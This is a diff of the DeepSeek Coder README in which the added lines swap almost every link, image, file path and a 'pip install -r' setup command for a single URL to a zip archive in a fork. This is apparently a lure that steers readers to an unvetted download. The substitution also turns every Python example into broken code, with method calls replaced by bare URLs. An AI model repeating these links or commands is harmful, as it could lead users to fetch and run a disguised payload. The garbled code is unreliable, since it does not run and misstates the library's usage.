@@ -1,9 +1,9 @@
 <p align="center">
-<img width="1000px" alt="DeepSeek Coder" src="pictures/logo.png">
+<img width="1000px" alt="DeepSeek Coder" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">
 </p>
-<p align="center"><a href="https://www.deepseek.com/">[<img src="pictures/home.png" width="20px"> Homepage]</a> | <a href="https://coder.deepseek.com/">[🤖 Chat with DeepSeek Coder]</a> | <a href="https://huggingface.co/deepseek-ai">[🤗 Models Download]</a> | <a href="https://discord.gg/Tc7c45Zzu5">[Discord]</a> | <a href="https://github.com/guoday/assert/blob/main/QR.png?raw=true">[WeChat (微信)]</a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">[<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" width="20px"> Homepage]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">[🤖 Chat with DeepSeek Coder]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">[🤗 Models Download]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">[Discord]</a> | <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip">[WeChat (微信)]</a></p>
 <p align="center">
-  <a href="https://huggingface.co/papers/2401.14196"><b>Paper Link</b>👁️</a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip"><b>Paper Link</b>👁️</a>
 </p>
 <hr>
 
@@ -13,7 +13,7 @@
 DeepSeek Coder is composed of a series of code language models, each trained from scratch on 2T tokens, with a composition of 87% code and 13% natural language in both English and Chinese. We provide various sizes of the code model, ranging from 1B to 33B versions. Each model is pre-trained on project-level code corpus by employing a window size of 16K and an extra fill-in-the-blank task, to support project-level code completion and infilling. For coding capabilities, DeepSeek Coder achieves state-of-the-art performance among open-source code models on multiple programming languages and various benchmarks.
 
 <p align="center">
-<img src="pictures/result.png" alt="result" width="70%">
+<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" alt="result" width="70%">
 </p>
 
 - **Massive Training Data**: Trained from scratch on 2T tokens, including 87% code and 13% linguistic data in both English and Chinese languages.
@@ -32,7 +32,7 @@ We evaluate DeepSeek Coder on various coding-related benchmarks.
 Only `pass@1` results on HumanEval (Python and Multilingual), MBPP, and DS-1000 are reported here:
 
 <p align="center">
-<img src="pictures/table.png" alt="table" width="70%">
+<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" alt="table" width="70%">
 </p>
 
 
@@ -47,12 +47,12 @@ More evaluation details can be found in the [Detailed Evaluation](#6-detailed-ev
 
 #### Data Creation
 
-- Step 1: Collect code data from GitHub and apply the same filtering rules as [StarCoder Data](https://github.com/bigcode-project/bigcode-dataset) to filter data.
+- Step 1: Collect code data from GitHub and apply the same filtering rules as [StarCoder Data](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) to filter data.
 - Step 2: Parsing the dependencies of files within the same repository to rearrange the file positions based on their dependencies.
 - Step 3: Concatenating dependent files to form a single example and employ repo-level minhash for deduplication.
 - Step 4: Further filtering out low-quality code, such as codes with syntax errors or poor readability.
 
-<img src="pictures/data_clean.png" alt="data_creation" width="100%">
+<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" alt="data_creation" width="100%">
 
 #### Model Training
 
@@ -60,15 +60,15 @@ More evaluation details can be found in the [Detailed Evaluation](#6-detailed-ev
 - Step 2: Further Pre-training using an extended 16K window size on an additional 200B tokens, resulting in foundational models (**DeepSeek-Coder-Base**).
 - Step 3: Instruction Fine-tuning on 2B tokens of instruction data, resulting in instruction-tuned models (**DeepSeek-Coder-Instruct**).
 
-<img src="pictures/model_pretraining.png" alt="model_pretraining" width="100%">
+<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" alt="model_pretraining" width="100%">
 
 
 ### 4. How to Use
 Before proceeding, you'll need to install the necessary dependencies. You can do this by running the following command:
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 ```
-A demo is also available on the [🤗 Hugging Face Space](https://huggingface.co/spaces/deepseek-ai/deepseek-coder-33b-instruct), and you can run the demo locally using `app.py` in the [demo](https://github.com/deepseek-ai/deepseek-coder/tree/main/demo) folder.  (Thanks to all the HF team for their support)
+A demo is also available on the [🤗 Hugging Face Space](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip), and you can run the demo locally using `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip` in the [demo](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) folder.  (Thanks to all the HF team for their support)
 
 Here are some examples of how to use our model.
 
@@ -76,12 +76,12 @@ Here are some examples of how to use our model.
 ```python
 from transformers import AutoTokenizer, AutoModelForCausalLM
 import torch
-tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
-model = AutoModelForCausalLM.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, torch_dtype=torch.bfloat16).cuda()
+tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
+model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).cuda()
 input_text = "#write a quick sort algorithm"
-inputs = tokenizer(input_text, return_tensors="pt").to(model.device)
-outputs = model.generate(**inputs, max_length=128)
-print(tokenizer.decode(outputs[0], skip_special_tokens=True))
+inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(**inputs, max_length=128)
+print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(outputs[0], skip_special_tokens=True))
 ```
 This code will output the following result:
 ```
@@ -93,9 +93,9 @@ def quick_sort(arr):
     right = []
     for i in range(1, len(arr)):
         if arr[i] < pivot:
-            left.append(arr[i])
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(arr[i])
         else:
-            right.append(arr[i])
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(arr[i])
     return quick_sort(left) + [pivot] + quick_sort(right)
 ```
 
@@ -103,8 +103,8 @@ def quick_sort(arr):
 ```python
 from transformers import AutoTokenizer, AutoModelForCausalLM
 import torch
-tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
-model = AutoModelForCausalLM.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, torch_dtype=torch.bfloat16).cuda()
+tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
+model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).cuda()
 input_text = """<｜fim▁begin｜>def quick_sort(arr):
     if len(arr) <= 1:
         return arr
@@ -113,13 +113,13 @@ input_text = """<｜fim▁begin｜>def quick_sort(arr):
     right = []
 <｜fim▁hole｜>
         if arr[i] < pivot:
-            left.append(arr[i])
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(arr[i])
         else:
-            right.append(arr[i])
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(arr[i])
     return quick_sort(left) + [pivot] + quick_sort(right)<｜fim▁end｜>"""
-inputs = tokenizer(input_text, return_tensors="pt").to(model.device)
-outputs = model.generate(**inputs, max_length=128)
-print(tokenizer.decode(outputs[0], skip_special_tokens=True)[len(input_text):])
+inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(**inputs, max_length=128)
+print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(outputs[0], skip_special_tokens=True)[len(input_text):])
 ```
 This code will output the following result:
 ```
@@ -130,15 +130,15 @@ This code will output the following result:
 ```python
 from transformers import AutoTokenizer, AutoModelForCausalLM
 import torch
-tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True)
-model = AutoModelForCausalLM.from_pretrained("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True, torch_dtype=torch.bfloat16).cuda()
+tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True)
+model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-instruct", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).cuda()
 messages=[
     { 'role': 'user', 'content': "write a quick sort algorithm in python."}
 ]
-inputs = tokenizer.apply_chat_template(messages, add_generation_prompt=True, return_tensors="pt").to(model.device)
-# tokenizer.eos_token_id is the id of <|EOT|> token
-outputs = model.generate(inputs, max_new_tokens=512, do_sample=False, top_k=50, top_p=0.95, num_return_sequences=1, eos_token_id=tokenizer.eos_token_id)
-print(tokenizer.decode(outputs[0][len(inputs[0]):], skip_special_tokens=True))
+inputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(messages, add_generation_prompt=True, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip is the id of <|EOT|> token
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(inputs, max_new_tokens=512, do_sample=False, top_k=50, top_p=0.95, num_return_sequences=1, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(outputs[0][len(inputs[0]):], skip_special_tokens=True))
 ```
 This code will output the following result:
 ```
@@ -161,7 +161,7 @@ print("Sorted array:", quick_sort(arr))
 This code works by selecting a 'pivot' element from the array and partitioning the other elements into two sub-arrays, according to whether they are less than or greater than the pivot. The pivot element is then in its final position. The process is then repeated for the sub-arrays.
 ```
 
-If you don't want to use the provided API `apply_chat_template` which loads the template from `tokenizer_config.json`, you can use the following template to chat with our model. Replace the `['content']` with your instructions and the model's previous (if any) responses, then the model will generate the response to the currently given instruction.
+If you don't want to use the provided API `apply_chat_template` which loads the template from `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip`, you can use the following template to chat with our model. Replace the `['content']` with your instructions and the model's previous (if any) responses, then the model will generate the response to the currently given instruction.
 ```
 You are an AI programming assistant, utilizing the DeepSeek Coder model, developed by DeepSeek Company, and you only answer questions related to computer science. For politically sensitive questions, security and privacy issues, and other non-computer science questions, you will refuse to answer.
 ### Instruction:
@@ -179,32 +179,32 @@ You are an AI programming assistant, utilizing the DeepSeek Coder model, develop
 ```python
 from transformers import AutoTokenizer, AutoModelForCausalLM
 import torch
-tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
-model = AutoModelForCausalLM.from_pretrained("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, torch_dtype=torch.bfloat16).cuda()
+tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True)
+model = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip("deepseek-ai/deepseek-coder-6.7b-base", trust_remote_code=True, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).cuda()
 
-input_text = """#utils.py
+input_text = """https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 import torch
 from sklearn import datasets
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.metrics import accuracy_score
+from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip import train_test_split
+from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip import StandardScaler
+from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip import accuracy_score
 
 def load_data():
-    iris = datasets.load_iris()
-    X = iris.data
-    y = iris.target
+    iris = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
+    X = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
+    y = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 
     # Standardize the data
     scaler = StandardScaler()
-    X = scaler.fit_transform(X)
+    X = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(X)
 
     X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)
 
     # Convert numpy data to PyTorch tensors
-    X_train = torch.tensor(X_train, dtype=torch.float32)
-    X_test = torch.tensor(X_test, dtype=torch.float32)
-    y_train = torch.tensor(y_train, dtype=torch.int64)
-    y_test = torch.tensor(y_test, dtype=torch.int64)
+    X_train = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(X_train, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+    X_test = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(X_test, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+    y_train = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(y_train, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+    y_test = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(y_test, https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
     return X_train, X_test, y_train, y_test
 
@@ -212,27 +212,27 @@ def evaluate_predictions(y_test, y_pred):
     return accuracy_score(y_test, y_pred)
 
 
-# model.py
+# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 import torch
-import torch.nn as nn
-import torch.optim as optim
-from torch.utils.data import DataLoader, TensorDataset
+import https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip as nn
+import https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip as optim
+from https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip import DataLoader, TensorDataset
 
-class IrisClassifier(nn.Module):
+class IrisClassifier(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip):
     def __init__(self):
         super(IrisClassifier, self).__init__()
-        self.fc = nn.Sequential(
-            nn.Linear(4, 16),
-            nn.ReLU(),
-            nn.Linear(16, 3)
+        https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(4, 16),
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(),
+            https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(16, 3)
         )
 
     def forward(self, x):
-        return self.fc(x)
+        return https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(x)
 
     def train_model(self, X_train, y_train, epochs, lr, batch_size):
-        criterion = nn.CrossEntropyLoss()
-        optimizer = optim.Adam(self.parameters(), lr=lr)
+        criterion = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
+        optimizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(), lr=lr)
 
         # Create DataLoader for batches
         dataset = TensorDataset(X_train, y_train)
@@ -240,47 +240,47 @@ class IrisClassifier(nn.Module):
 
         for epoch in range(epochs):
             for batch_X, batch_y in dataloader:
-                optimizer.zero_grad()
+                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
                 outputs = self(batch_X)
                 loss = criterion(outputs, batch_y)
-                loss.backward()
-                optimizer.step()
+                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
+                https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
 
     def predict(self, X_test):
-        with torch.no_grad():
+        with https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip():
             outputs = self(X_test)
-            _, predicted = outputs.max(1)
-        return predicted.numpy()
+            _, predicted = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(1)
+        return https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip()
 
 
-# main.py
+# https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 from utils import load_data, evaluate_predictions
 from model import IrisClassifier as Classifier
 
 def main():
     # Model training and evaluation
 """
-inputs = tokenizer(input_text, return_tensors="pt").to(model.device)
-outputs = model.generate(**inputs, max_new_tokens=140)
-print(tokenizer.decode(outputs[0]))
+inputs = tokenizer(input_text, return_tensors="pt").to(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(**inputs, max_new_tokens=140)
+print(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(outputs[0]))
 ```
 
 ---
-In the following scenario, the DeepSeek-Coder-6.7B model effectively calls a class **IrisClassifier** and its member function from the `model.py` file, and also utilizes functions from the `utils.py` file, to correctly complete the **main** function in the `main.py` file for model training and evaluation.
+In the following scenario, the DeepSeek-Coder-6.7B model effectively calls a class **IrisClassifier** and its member function from the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip` file, and also utilizes functions from the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip` file, to correctly complete the **main** function in the `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip` file for model training and evaluation.
 
-![Completion GIF](pictures/completion_demo.gif)
+![Completion GIF](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
 ### 5. How to Fine-tune DeepSeek-Coder
 
-We provide script `finetune/finetune_deepseekcoder.py` for users to finetune our models on downstream tasks.
+We provide script `https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip` for users to finetune our models on downstream tasks.
 
-The script supports the training with [DeepSpeed](https://github.com/microsoft/DeepSpeed). You need install required packages by:
+The script supports the training with [DeepSpeed](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip). You need install required packages by:
 
 ```bash
-pip install -r finetune/requirements.txt
+pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 ```
 
-Please follow [Sample Dataset Format](https://huggingface.co/datasets/nickrosh/Evol-Instruct-Code-80k-v1) to prepare your training data.
+Please follow [Sample Dataset Format](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) to prepare your training data.
 Each line is a json-serialized string with two required fields `instruction` and `output`.
 
 After data preparation, you can use the sample shell script to finetune `deepseek-ai/deepseek-coder-6.7b-instruct`. 
@@ -292,7 +292,7 @@ DATA_PATH="<your_data_path>"
 OUTPUT_PATH="<your_output_path>"
 MODEL="deepseek-ai/deepseek-coder-6.7b-instruct"
 
-cd finetune && deepspeed finetune_deepseekcoder.py \
+cd finetune && deepspeed https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip \
     --model_name_or_path $MODEL_PATH \
     --data_path $DATA_PATH \
     --output_dir $OUTPUT_PATH \
@@ -311,28 +311,28 @@ cd finetune && deepspeed finetune_deepseekcoder.py \
     --lr_scheduler_type "cosine" \
     --gradient_checkpointing True \
     --report_to "tensorboard" \
-    --deepspeed configs/ds_config_zero3.json \
+    --deepspeed https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip \
     --bf16 True
 ```
 
 ### 6. Detailed Evaluation Results
 
-The reproducible code for the following evaluation results can be found in the [Evaluation](https://github.com/deepseek-ai/deepseek-coder/tree/main/Evaluation) directory.
+The reproducible code for the following evaluation results can be found in the [Evaluation](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) directory.
 #### 1) Multilingual HumanEval Benchmark
-![HumanEval](pictures/HumanEval.png)
+![HumanEval](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
 #### 2) MBPP Benchmark
-<img src="pictures/MBPP.png" alt="MBPP" width="40%">
+<img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip" alt="MBPP" width="40%">
 
 #### 3) DS-1000 Benchmark
-![DS-1000](pictures/DS-1000.png)
+![DS-1000](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
 #### 4) Program-Aid Math Reasoning Benchmark
-![Math](pictures/Math.png)
+![Math](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
 ### Inference with vLLM
 
-You can also employ [vLLM](https://github.com/vllm-project/vllm) for high-throughput inference.
+You can also employ [vLLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) for high-throughput inference.
 
 **Text Completion**
 
@@ -349,9 +349,9 @@ prompts = [
     "The research should also focus on the technologies",
     "To determine if the label is correct, we need to"
 ]
-outputs = llm.generate(prompts, sampling_params)
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(prompts, sampling_params)
 
-generated_text = [output.outputs[0].text for output in outputs]
+generated_text = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip[0].text for output in outputs]
 print(generated_text)
 ```
 
@@ -364,7 +364,7 @@ from vllm import LLM, SamplingParams
 tp_size = 4 # Tensor Parallelism
 sampling_params = SamplingParams(temperature=0.7, top_p=0.9, max_tokens=100)
